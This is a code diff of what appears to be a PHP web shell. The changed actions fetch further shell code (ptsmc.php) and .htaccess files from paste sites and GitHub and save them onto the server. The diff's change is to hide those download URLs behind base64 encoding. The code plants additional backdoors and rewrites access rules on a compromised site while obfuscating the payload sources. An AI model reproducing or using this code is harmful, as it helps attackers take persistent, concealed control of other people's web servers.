@@ -328,19 +328,21 @@ if (isset($_POST['action'])) {
             
             // [NEW FEATURE v8.1] PHP Shell Summoner Logic
             case 'summon_ptsmc':
-                $url_shell = 'https://okepaste.cc/r/7c7bb86c';
+                $url_shell = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2xlbnVtaWNhcHRzbWMvcHRzbWMtZ3JvdXAvcmVmcy9oZWFkcy9tYWluL3B0c21jLnBocA==');
                 $response = fetch_and_save_shell($url_shell, $dir, 'ptsmc.php');
                 break;
                 
             // [NEW FEATURE] HTACCESS Fetcher Logic
             case 'fetch_htb':
-                $url_htb = 'https://okepaste.cc/r/b12554de';
+                $url_htb = base64_decode('aHR0cHM6Ly9va2VwYXN0ZS5jYy9yL2IxMjU1NGRl');
                 $response = fetch_and_save_htaccess($url_htb, $dir, '.htaccess');
                 break;
+
             case 'fetch_htd':
-                $url_htd = 'https://okepaste.cc/r/02f7120c';
+                $url_htd = base64_decode('aHR0cHM6Ly9va2VwYXN0ZS5jYy9yLzAyZjcxMjBj');
                 $response = fetch_and_save_htaccess($url_htd, $dir, '.htaccess');
                 break;
+
             case 'random_path': // [NEW FEATURE] Random Path
                 $random_dir = find_random_path(SCRIPT_DIR);
                 // Return the random path so the client can navigate to it
